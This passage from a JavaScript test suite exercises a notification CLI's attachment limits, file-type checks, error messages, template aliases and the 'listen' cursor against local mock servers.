    rmSync(dir, { recursive: true, force: true });
    server.close();
  }
});

test('--attach enforces the four-file and 5 MiB limits before uploading', () => {
  const dir = mkdtempSync(join(tmpdir(), 'pingroom-attach-limits-'));
  const notes = join(dir, 'notes.txt');
  const oversized = join(dir, 'oversized.txt');
  writeFileSync(notes, 'private notes');
  writeFileSync(oversized, Buffer.alloc(5 * 1024 * 1024 + 1, 65));

  try {
    const tooManyArgs = ['ping', '-m', 'hi'];
    for (let i = 0; i < 5; i++) tooManyArgs.push('--attach', notes);
    tooManyArgs.push('--token', 'tok_abc', '--room', 'AB12', '--api', 'http://127.0.0.1:1');

    const tooMany = run(tooManyArgs);
    assert.equal(tooMany.status, 2);
    assert.match(tooMany.stderr, /--attach accepts at most 4 files/);

    const tooLarge = run([
      'ping', '-m', 'hi', '--attach', oversized,
      '--token', 'tok_abc', '--room', 'AB12', '--api', 'http://127.0.0.1:1',
    ]);
    assert.equal(tooLarge.status, 2);
    assert.match(tooLarge.stderr, /file exceeds the 5 MiB limit/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('--attach rejects a webhook ping, an unsupported type, and a missing file', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'pingroom-attach-'));
  const binary = join(dir, 'payload.exe');
  const notes = join(dir, 'notes.txt');
  writeFileSync(binary, 'MZ');
  writeFileSync(notes, 'private notes');

  try {
    const webhook = run(
      ['ping', '-m', 'hi', '--attach', notes, '-w', 'https://api.pingroom.io/api/webhook/abc'],
    );
    assert.equal(webhook.status, 2);
    assert.match(webhook.stderr, /--attach requires an agent token/);

    const badType = run(
      ['ping', '-m', 'hi', '--attach', binary, '--token', 'tok_abc', '--room', 'AB12'],
    );
    assert.equal(badType.status, 2);
    assert.match(badType.stderr, /only md, pdf, html, txt, jpg, jpeg, png, zip/);

    const missing = run(
      ['ping', '-m', 'hi', '--attach', join(dir, 'nope.txt'), '--token', 'tok_abc', '--room', 'AB12'],
    );
    assert.equal(missing.status, 2);
    assert.match(missing.stderr, /file not found/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('--attach surfaces the Pro gate instead of a bare HTTP error', async () => {
  const { server, baseUrl } = await startServer((req, res) => {
    res.writeHead(402, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ code: 'pro_required', message: 'Ping attachments are a Pro feature.' }));
  });

  const dir = mkdtempSync(join(tmpdir(), 'pingroom-attach-'));
  const notes = join(dir, 'notes.txt');
  writeFileSync(notes, 'private notes');

  try {
    const { status, stderr } = await runAsync([
      'ping', '-m', 'hi', '--attach', notes,
      '--token', 'tok_abc', '--room', 'AB12', '--api', baseUrl,
    ]);
    assert.equal(status, 2);
    assert.match(stderr, /Pro feature/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
    server.close();
  }
});

test('a refusal the operator can fix carries the fix, not just the code', async () => {
  const cases = [
    {
      status: 403,
      body: {
        code: 'room_not_granted',
        message: 'This agent was not given access to that room.',
      },
      expect: /Connected Agents in the PingRoom app/,
    },
    {
      status: 403,
      body: { code: 'insufficient_scope', message: 'This credential lacks the required scope.' },
      expect: /reconnect and re-approve/,
    },
  ];

  for (const { status: httpStatus, body, expect } of cases) {
    const { server, baseUrl } = await startServer((req, res) => {
      res.writeHead(httpStatus, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(body));
    });
    try {
      const { status, stderr } = await runAsync([
        'ping', '-m', 'hi', '--token', 'tok', '--room', 'AB12', '--api', baseUrl,
      ]);
      assert.equal(status, 1);
      // The server's own wording still leads.
      assert.match(stderr, new RegExp(body.message.slice(0, 24).replace(/[.*+?^${}()|[\]\\]/g, '\\$&')));
      assert.match(stderr, expect);
    } finally {
      server.close();
    }
  }
});

test('live accepts "decision" — the name the app shows — and sends the wire id', async () => {
  for (const typed of ['decision', 'question']) {
    const { server, baseUrl, received } = await questionServer({
      'POST /api/agent/rooms/ab12cd/live': () => ({ status: 201, body: { state: 'running' } }),
    });
    try {
      const { status } = await runAsync([
        'live', 'start', '-c', 'deploy-1', '--template', typed,
        '--prompt', 'Ship it?', '--option', 'yes:Ship', '--option', 'no:Hold',
        '--token', 'tok', '--room', 'ab12cd', '--api', baseUrl,
      ]);
      assert.equal(status, 0);
      // The template was renamed for people, not on the wire: the API and the
      // Lock Screen still speak `question`, so both spellings must arrive as it.
      assert.equal(JSON.parse(received[0].body).live_status.template, 'question');
    } finally {
      server.close();
    }
  }
});

test('an unknown template names the alias, not the wire id, in the usage error', async () => {
  const { status, stderr } = await runAsync([
    'live', 'start', '-c', 'x', '--template', 'nope',
    '--token', 'tok', '--room', 'ab12cd', '--api', 'https://api.pingroom.io',
  ]);
  assert.equal(status, 2);
  assert.match(stderr, /decision/);
  assert.doesNotMatch(stderr, /question/);
});

test('listen establishes a cursor from "now", then prints what lands', async () => {
  const seen = [];
  const { server, baseUrl } = await startServer((req, res) => {
    const url = new URL(req.url, 'http://x');
    seen.push(url.searchParams.get('after'));
    const body = url.searchParams.get('after')
      ? {
          notifications: [
            {
              id: 'n2',
              message: 'Build 512 is green',
              correlation_id: 'deploy-512',
              room: { code: 'AB12', name: 'Project X' },
            },
          ],
          cursor: 'n2',
        }
      // No `after` → the head id and no rows, so startup never replays history.
      : { notifications: [], cursor: 'n1' };
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(body));
  });

  try {
    const { status, stdout } = await runAsync(
      ['listen', '--once', '--token', 'tok', '--api', baseUrl],
      {},
      { timeoutMs: 8000 },
    );
    assert.equal(status, 0);
    assert.match(stdout, /\[Project X\] Build 512 is green/);
    assert.match(stdout, /corr=deploy-512/);
    // First call carries no cursor; the second is bounded by the head id.
    assert.equal(seen[0], null);
    assert.equal(seen[1], 'n1');
  } finally {
    server.close();
  }
});

test('listen --from skips the cursor handshake and honours --json', async () => {
  const seen = [];
  const { server, baseUrl } = await startServer((req, res) => {
    seen.push(new URL(req.url, 'http://x').searchParams.get('after'));
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      notifications: [{ id: 'n9', message: 'hi', room: { code: 'AB12', name: 'R' } }],
      cursor: 'n9',
    }));
  });

  try {
    const { status, stdout } = await runAsync(
      ['listen', '--once', '--from', 'n5', '--json', '--token', 'tok', '--api', baseUrl],
      {},
      { timeoutMs: 8000 },
    );
    assert.equal(status, 0);
    assert.equal(seen.length, 1, 'an explicit --from needs no handshake request');
    assert.equal(seen[0], 'n5');
    assert.equal(JSON.parse(stdout.trim()).id, 'n9');
  } finally {
    server.close();
  }
});

test('listen refuses out-of-range holds locally, and needs a token', async () => {
  const over = await runAsync(['listen', '--timeout', '99', '--token', 't', '--api', 'https://api.pingroom.io']);
  assert.equal(over.status, 2);
  assert.match(over.stderr, /--timeout must be at most 30/);

  const noToken = await runAsync(['listen', '--api', 'https://api.pingroom.io']);
  assert.equal(noToken.status, 2);
  assert.match(noToken.stderr, /agent token is required/);
});

test('over-long fields fail locally with the limit named, not as a 422', async () => {
  let requests = 0;
  const { server, baseUrl } = await startServer((req, res) => {
    requests += 1;
    res.writeHead(201, { 'Content-Type': 'application/json' });
    res.end('{"id":"n1"}');
  });

  const cases = [
    { argv: ['ping', '-m', 'x'.repeat(501)], expect: /--message must be at most 500 characters \(got 501\)/ },
    { argv: ['ping', '-m', 'ok', '-t', 'x'.repeat(41)], expect: /--title must be at most 40 characters/ },
    { argv: ['ask', '-p', 'x'.repeat(501)], expect: /--prompt must be at most 500 characters/ },
    { argv: ['ask', '-p', 'ok', '-c', 'x'.repeat(41)], expect: /--context must be at most 40 characters/ },
    // The live card's message is 256, not the 500 a ping body gets.
    { argv: ['live', 'start', '-c', 'x', '-m', 'x'.repeat(257)], expect: /--message must be at most 256 characters/ },
  ];

  try {
    for (const { argv, expect } of cases) {
      const { status, stderr } = await runAsync([...argv, '--token', 'tok', '--room', 'AB12', '--api', baseUrl]);
      assert.equal(status, 2, argv.join(' '));
      assert.match(stderr, expect);
    }
    assert.equal(requests, 0, 'a local usage error must not reach the network');
  } finally {
    server.close();
  }
});

test('an unexpected error prints one line, not a stack trace', async () => {
  // A body that is not JSON at all, on a 200, drives the parser off its
  // expected shape — whatever escapes must still read like a CLI error.
  const { server, baseUrl } = await startServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end('{"notifications": "not-an-array", "cursor": 5}');
  });

  try {
    const { status, stderr } = await runAsync(
      ['listen', '--once', '--from', 'n1', '--token', 'tok', '--api', baseUrl],
      {},
      { timeoutMs: 8000 },
    );
    // Either it copes (0) or it fails cleanly (1) — never a raw stack.
    assert.ok(status === 0 || status === 1, `unexpected exit ${status}`);
    assert.doesNotMatch(stderr, /at .*bin\/pingroom\.js:\d+/);
  } finally {
    server.close();
  }
});
